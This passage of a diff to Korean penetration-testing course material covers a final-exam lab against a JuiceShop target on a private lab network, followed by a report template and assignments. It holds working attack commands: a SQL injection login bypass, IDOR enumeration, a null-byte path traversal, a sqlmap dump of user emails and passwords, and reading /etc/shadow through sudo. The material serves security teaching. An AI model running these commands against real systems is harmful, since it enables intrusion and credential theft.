-  [ ] SQL Injection 테스트
-  [ ] XSS 테스트
-  [ ] 인증 우회 테스트
-  [ ] 디렉토리 트래버설 테스트
-  [ ] 파일 업로드 테스트
-
-서버 공격:
-  [ ] sudo 권한 확인 및 악용
-  [ ] SUID 바이너리 검사
-  [ ] Cron job 확인
-  [ ] 권한 상승 시도
-
-네트워크:
-  [ ] 방화벽 규칙 분석
-  [ ] IPS 우회 시도
-  [ ] 서버 간 접근 테스트
-
-보고서:
-  [ ] 모든 취약점 문서화
-  [ ] CVSS 점수 부여
-  [ ] ATT&CK ID 매핑
-  [ ] 재현 단계 작성
-  [ ] 권고 사항 포함
-  [ ] 증거(명령어 출력) 첨부
-```
-
-### 6.3 자주 사용하는 명령어 모음
+### 정찰 (15분)
 
 ```bash
-# SSH 접속
-ssh ccc@10.20.30.80
+# 전체 네트워크 + 서비스
+nmap -sn 10.20.30.0/24
+nmap -sV -p- 10.20.30.80 | head -30
+nmap -sV -p 22,443,8080 10.20.30.100 | head -10
 
-# 포트 스캔
-nmap -sT -F 10.20.30.80
+# API 구조
+curl -s http://10.20.30.80:3000/main.js | grep -oE '/api/[A-Za-z]+' | sort -u
+curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
+```
 
-# 웹 요청
-curl -s http://10.20.30.80:3000/rest/products/search?q=test
+### 취약점 발견 (30분)
 
-# Bastion API
-export BASTION_API_KEY="ccc-api-key-2026"
-curl -s -H "X-API-Key: $BASTION_API_KEY" http://localhost:9100/projects
+```bash
+# SQLi
+curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | python3 -m json.tool
 
-# 권한 확인
-sudo -l
-find / -perm -4000 -type f 2>/dev/null
+# IDOR
+ADMIN_TOKEN=... # 위에서 획득
+for i in 1 2 3 4 5; do
+  curl -s -o /dev/null -w "basket/$i: %{http_code}\n" \
+    http://10.20.30.80:3000/rest/basket/$i \
+    -H "Authorization: Bearer $ADMIN_TOKEN"
+done
 
-# 로그 확인
-sudo tail -20 /var/log/auth.log
-sudo tail -20 /var/log/suricata/fast.log
+# /ftp null byte
+for f in package.json.bak suspicious_errors.yml; do
+  echo "=== $f ==="
+  curl -s "http://10.20.30.80:3000/ftp/${f}%2500.md" | head -10
+done
+
+# sudo NOPASSWD
+ssh ccc@10.20.30.80 "sudo -l | head -5"
+
+# /etc/shadow
+ssh ccc@10.20.30.80 "sudo cat /etc/shadow | head -3"
+```
+
+### 공격 실행·권한 상승 (30분)
+
+```bash
+# admin 토큰 → 관리자 API
+curl -s http://10.20.30.80:3000/api/Users/ \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{len(d[\"data\"])}명 사용자 유출')"
+
+# sqlmap 자동화
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+  --batch -T Users -C email,password --dump 2>&1 | tail -30
+
+# 수직 권한상승
+ssh ccc@10.20.30.80 "sudo whoami"   # root
+```
+
+### 증거·보고서 (45분)
+
+```bash
+# Bastion evidence 전체 덤프
+curl -s "http://10.20.30.200:8003/evidence?limit=100" > /tmp/evidence.json
+python3 -c "
+import json
+data = json.load(open('/tmp/evidence.json'))
+print(f'총 {len(data)}건 이력')
+skills = {}
+for e in data:
+    skills[e.get('skill','?')] = skills.get(e.get('skill','?'), 0) + 1
+for s, c in sorted(skills.items(), key=lambda x: -x[1]):
+    print(f'  {s}: {c}회')
+"
+```
+
+### Bastion 자동 보고서 초안 (15분)
+
+```bash
+curl -s -X POST http://10.20.30.200:8003/ask \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "message": "오늘 /evidence에 기록된 최근 100건을 분석해서 PTES 형식 모의해킹 보고서 초안을 작성해줘. 섹션: Executive Summary / Test Overview / Findings (각 findings에는 CVSS·ATT&CK·재현·증거·권고 포함) / Appendix. 한국어, markdown."
+  }' \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])" > /tmp/draft_report.md
+
+wc -l /tmp/draft_report.md
+# → 초안을 수동으로 검증·보강하여 최종 제출
+```
+
+**중요:** Bastion이 생성한 초안은 **참고용**. 반드시 수동으로:
+- hallucination 점검 (존재하지 않는 URL/CVE)
+- 증거 스크린샷 추가
+- 재현 단계 검증
+- CVSS 점수 직접 산정
+
+---
+
+# Part 5: 보고서 템플릿
+
+학생 제출용 최소 템플릿. 실제 제출 보고서는 아래 형식을 기본으로 확장.
+
+```markdown
+# CCC 모의해킹 보고서 — [본인 이름]
+## 날짜: 2026-MM-DD | 과정: Course1-Attack | 기밀
+
+## 1. Executive Summary
+
+본 평가에서 JuiceShop과 주변 인프라에 대해 총 N개 취약점을 발견했다.
+- Critical: X개
+- High: Y개
+- Medium: Z개
+- Low: W개
+
+핵심 권고:
+1. ...
+2. ...
+3. ...
+
+## 2. Test Overview
+
+- 범위: 10.20.30.0/24 (manager/secu/web/siem)
+- 방법론: PTES Gray Box
+- 도구: nmap, curl, sqlmap, sqlite3, ssh, Python3, Bastion /ask
+- 일정: 2026-MM-DD 10:00~13:00
+
+## 3. Findings
+
+### F-01 [CRITICAL 9.8] ...
+
+**시스템:** ...
+**ATT&CK:** ...
+**설명:** ...
+**재현:** ...
+**증거:** ...
+**권고:** ...
+
+### F-02 [HIGH 8.8] ...
+...
+
+## 4. Appendix
+
+### A. 전체 스캔 결과
+...
+
+### B. 사용 도구·버전
+- nmap 7.94
+- sqlmap 1.7.2
+- Bastion Agent :8003 (gemma3:4b)
+
+### C. ATT&CK Navigator Layer
+(JSON 첨부)
+
+### D. Bastion /evidence 요약
+- 총 N건
+- Skill 분포: ssh_exec X%, nmap_scan Y%, http_probe Z%
 ```
 
 ---
 
-## 7. 핵심 정리
+# Part 6: 과정 총괄 정리
 
-- 침투 테스트는 **방법론(PTES)**을 따라 체계적으로 수행한다
-- **범위와 교전 규칙**을 명확히 정의하고 준수한다
-- 발견된 취약점은 **CVSS 점수와 ATT&CK ID**로 분류한다
-- 보고서는 **비기술자도 이해할 수 있는 경영진 요약**을 포함한다
-- **재현 가능한 단계와 증거**가 보고서의 핵심이다
-- 침투 테스트의 목적은 파괴가 아니라 **보안 개선**이다
+## 6.1 학습한 전술(9) × 기법(35)
 
----
+Week 02~12의 ATT&CK 매트릭스 커버리지. Week 13에서 Navigator Layer로 시각화.
 
-## 과정 총정리
+## 6.2 수동 vs 자동 균형
 
-| 주차 | 주제 | 핵심 기법 |
-|------|------|-----------|
-| 01 | 사이버보안 개론 | 기본 개념, CIA 3원칙 |
-| 02 | 웹 정찰 | robots.txt, 디렉토리 스캔 |
-| 03 | 클라이언트 공격 | HTML/JS 분석, 쿠키 조작 |
-| 04 | XSS | Reflected, Stored XSS |
-| 05 | SQL Injection | Union, Blind SQLi |
-| 06 | Command Injection | OS 명령 실행 |
-| 07 | 파일 공격 | 업로드, 트래버설 |
-| 08 | CSRF/SSRF | 요청 위조 |
-| 09 | 네트워크 공격 | 포트 스캔, 패킷 캡처 |
-| 10 | IPS/방화벽 우회 | 인코딩, 터널링 |
-| 11 | 권한 상승 | SUID, sudo, PATH |
-| 12 | 지속성/흔적 제거 | SSH 키, cron, 로그 삭제 |
-| 13 | MITRE ATT&CK | 프레임워크 매핑 |
-| 14 | Bastion 자동화 | API 기반 침투 테스트 |
-| **15** | **기말** | **종합 침투 테스트** |
+- **수동 학습의 가치:** 명령·옵션·페이로드 구조 체득
+- **자동화의 가치:** 반복 실습·증적 영속화·협업 효율
+- **실무 현실:** 두 접근의 조합
 
-> 이 과정에서 학습한 모든 기법은 **방어 역량 강화**를 위한 것이다.
-> 허가 없이 타인의 시스템에 이 기법을 적용하는 것은 **불법**이다.
+## 6.3 다음 단계 (심화 과정)
+
+| 다음 과정 | 내용 |
+|----------|------|
+| Course 11 Battle | Red vs Blue 공방전 |
+| Course 12 Battle Advanced | APT 킬체인 시뮬 |
+| Course 13 Attack Advanced | 고급 공격 (Kerberoast, AD, C2) |
+| Course 14 SOC Advanced | 방어 관제 심화 |
+| Course 20 Agent IR Advanced | AI 에이전트 공격 침해대응 심화 |
 
 ---
 
----
+## 과제 (기말 제출물)
 
-## 자가 점검 퀴즈 (5문항)
+### 제출 1: PTES 보고서 (60점)
+- `CCC_학번_모의해킹보고서.md`
+- Part 5 템플릿 확장
+- 최소 5개 Findings (각 CVSS + ATT&CK + 재현)
 
-이번 주차의 핵심 기술 내용을 점검한다.
+### 제출 2: ATT&CK Navigator Layer JSON (15점)
+- `CCC_학번_attack_layer.json`
+- Week 13에서 작성한 Layer 확장
+- 기말에서 재발견한 모든 기법 포함
 
-**Q1.** 이 공격 기법이 OWASP Top 10에서 분류되는 카테고리는?
-- (a) Broken Access Control(A01)  (b) **Injection(A03)**  (c) Cryptographic Failures(A02)  (d) SSRF(A10)
+### 제출 3: 방어 권고서 (15점)
+- 본인 발견사항별 방어 룰·정책·코드
+- 최소 3개의 구체적 방어 구현 (예: Suricata rule, nftables rule, sudoers 수정)
 
-**Q2.** 공격자가 가장 먼저 실행하는 정찰 활동은?
-- (a) 랜섬웨어 배포  (b) **포트 스캔 및 서비스 핑거프린팅**  (c) DDoS 공격  (d) 방화벽 비활성화
+### 제출 4: Bastion evidence 덤프 (10점)
+- `curl -s "http://10.20.30.200:8003/evidence?limit=200" > evidence.json`
+- 기말 시험 시간 동안 수행한 Bastion 호출 전체 이력
 
-**Q3.** SQLi에서 '--'의 역할은?
-- (a) 문자열 연결  (b) **SQL 주석 (이후 쿼리 무시)**  (c) 변수 선언  (d) 함수 호출
-
-**Q4.** MITRE ATT&CK에서 이 기법의 전술(Tactic)은?
-- (a) Impact만  (b) **해당 전술 ID 확인 필요**  (c) 모든 전술  (d) 해당 없음
-
-**Q5.** 방어자가 이 공격을 탐지하기 위해 확인해야 하는 로그는?
-- (a) CPU 사용률만  (b) **SIEM 경보 + 해당 서비스 로그**  (c) 디스크 용량만  (d) 네트워크 대역폭만
-
-**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b
-
----
----
-
-> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab
+### 보너스 +15점
+- Bastion `/ask` 자동 보고서 초안 제시 + 수동 보강 과정 분석 (+5)
+- Week 13 Navigator Layer 기반 방어 커버리지 갭 분석 (+5)
+- 수동으로 찾기 어려운 취약점 1개 이상 발견 (+5)
 
 ---
 
-## 웹 UI 실습
+## 용어 해설 (최종)
 
-### Wazuh Dashboard에서 공격 흔적 확인
-
-> **접속 URL:** `https://10.20.30.100:443` (ID: `admin` / PW: 초기 설정값)
-
-1. 브라우저에서 `https://10.20.30.100:443` 접속 (인증서 경고 → "고급" → "계속")
-2. 로그인 후 좌측 메뉴에서 **Modules → Security events** 클릭
-3. 종합 침투 테스트에서 발생시킨 경보 확인:
-   ```
-   agent.name: web AND rule.level >= 5
-   ```
-4. 공격 단계별로 경보 추적:
-   - **정찰**: `rule.description: *scan*` 또는 `rule.groups: web`
-   - **익스플로잇**: `rule.level >= 10` 경보 확인
-   - **후속 공격**: `rule.groups: (syscheck OR rootcheck)` 파일 변경/무결성 경보
-5. 각 경보 클릭 → **Rule** 탭에서 탐지 룰 확인 → 어떤 공격이 탐지되었는지 분석
-6. **Modules → MITRE ATT&CK** 에서 자신의 공격이 ATT&CK 매트릭스의 어디에 매핑되는지 확인
-7. **Export** → CSV로 경보 내보내기 → 침투 테스트 보고서의 "탐지 현황" 섹션에 활용
-
-> **핵심 관점:** 공격자 입장에서 수행한 침투 테스트를 방어자 입장(SIEM)에서 되돌아보는 것이 이 실습의 목적이다. 어떤 공격이 탐지되고 어떤 공격이 탐지되지 않았는지를 분석하여 보고서에 포함한다.
+| 용어 | 영문 | 설명 |
+|------|------|------|
+| **PTES** | Penetration Testing Execution Standard | 침투 테스트 7단계 표준 |
+| **Scope** | - | 테스트 범위 (In/Out-of-Scope) |
+| **RoE** | Rules of Engagement | 교전 규칙 |
+| **Black/Gray/White Box** | - | 사전 정보 제공 정도 |
+| **CVSS v3.1** | Common Vulnerability Scoring System | 취약점 심각도 산정 표준 |
+| **Executive Summary** | - | 비기술자용 1페이지 요약 |
+| **Findings** | - | 발견 사항 상세 (CVSS·ATT&CK·재현·증거·권고) |
+| **Navigator Layer** | - | ATT&CK Navigator의 매핑 파일 (JSON) |
 
 ---
 
-## 📂 실습 참조 파일 가이드
+## 📂 기말 시험 도구 종합
 
-> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+### 수동 도구
 
-### 보고서 도구 (CVSS 계산기·Markdown·ReportLab)
-> **역할:** 취약점 보고서 표준화  
-> **실행 위치:** `작업 PC`  
-> **접속/호출:** FIRST CVSS 계산기 https://www.first.org/cvss/calculator/3.1
+| 도구 | 용도 | Week |
+|------|------|------|
+| nmap | 포트·서비스·OS | 02, 09 |
+| curl | HTTP 요청 전반 | 전 주차 |
+| python3 | JSON·JWT·base64·HMAC | 03, 04, 06 |
+| sqlmap | SQLi 자동화 | 04, 10 |
+| ssh + sudo | 서버 접근·권한상승 | 11, 12 |
+| tcpdump / tshark | 패킷 캡처·분석 | 09 |
+| openssl s_client | TLS 분석 | 03 |
 
-**주요 경로·파일**
+### Bastion API (:8003)
 
-| 경로 | 역할 |
-|------|------|
-| `reports/<project>/` | 재현 스크린샷·증적 저장 |
-| `template.md / template.docx` | 표준 템플릿 |
+| 메서드 | 경로 | 용도 |
+|--------|------|------|
+| POST | `/ask` | 자연어 지시 (정찰·스캔·보고서) |
+| POST | `/chat` | 스트리밍 (ReAct 관찰) |
+| GET | `/evidence?limit=N` | 이력 덤프 |
+| GET | `/skills` | 사용 가능 Skill |
+| GET | `/assets` | 관리 자산 목록 |
+| GET | `/health` | 가동 확인 |
 
-**핵심 설정·키**
+### 참조 리소스
 
-- `CVSS 3.1 벡터 예: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — Critical 9.8
-- `CWE ID + 권고 (remediation)` — 보고서 필수 항목
+- https://attack.mitre.org (ATT&CK)
+- https://mitre-attack.github.io/attack-navigator/ (Navigator)
+- https://gtfobins.github.io (권한상승 레시피)
+- https://www.first.org/cvss/calculator/3.1 (CVSS 계산기)
+- https://owasp.org/Top10/ (OWASP Top 10)
 
-**UI / CLI 요점**
+---
 
-- MermaidJS 공격 흐름도 — 교안/보고서 공통 도식
-- Pandoc `md → docx/pdf` — 포맷 변환
+## 수료 안내
 
-> **해석 팁.** 보고서 가치는 **재현 절차의 완결성**에 달려 있다. 스크린샷·요청/응답 전체·시간 기록을 포함해야 고객이 독립 검증 가능.
+본 Week 15를 통과하면:
+- **Course 1 Attack** 수료증 발급 대상
+- 누적 실습: 14주 + 과제 + 기말 = 약 200시간
+- 커버된 ATT&CK: 9 전술 × 35 기법
 
-### CCC Bastion Agent
-> **역할:** CCC 자율 운영 에이전트 — 스킬/플레이북/경험 학습  
-> **실행 위치:** `bastion (10.20.30.201)`  
-> **접속/호출:** TUI `./dev.sh bastion`, API `http://localhost:8003`
+**다음 과정으로** (선택):
+- Course 11 Battle — Red vs Blue 실전 공방전 참여
+- Course 13 Attack Advanced — C2·AD·고급 기법
+- Course 2 Security Ops — 방어 관제 관점으로 전환
 
-**주요 경로·파일**
+수료를 축하합니다. 더 배우려면 심화 과정으로.
 
-| 경로 | 역할 |
-|------|------|
-| `packages/bastion/agent.py` | 메인 에이전트 루프 |
-| `packages/bastion/skills.py` | 스킬 정의 |
-| `packages/bastion/playbooks/` | 정적 플레이북 YAML |
-| `data/bastion/experience/` | 수집된 경험 (pass/fail) |
+---
 
-**핵심 설정·키**
-
-- `LLM_BASE_URL / LLM_MODEL` — Ollama 연결
-- `CCC_API_KEY` — ccc-api 인증
-- `max_retry=2` — 실패 시 self-correction 재시도
-
-**로그·확인 명령**
-
-- ``docs/test-status.md`` — 현재 테스트 진척 요약
-- ``bastion_test_progress.json`` — 스텝별 pass/fail 원시
-
-**UI / CLI 요점**
-
-- 대화형 TUI 프롬프트 — 자연어 지시 → 계획 → 실행 → 검증
-- `/a2a/mission` (API) — 자율 미션 실행
-- Experience→Playbook 승격 — 반복 성공 패턴 저장
-
-> **해석 팁.** 실패 시 output을 분석해 **근본 원인 교정**이 설계의 핵심. 증상 회피/땜빵은 금지.
-
+> **실습 환경 검증 완료** (2026-03-28): 전체 취약점 목록 실증 완료. 기말 제출물은 본인 이름·학번으로 제출.
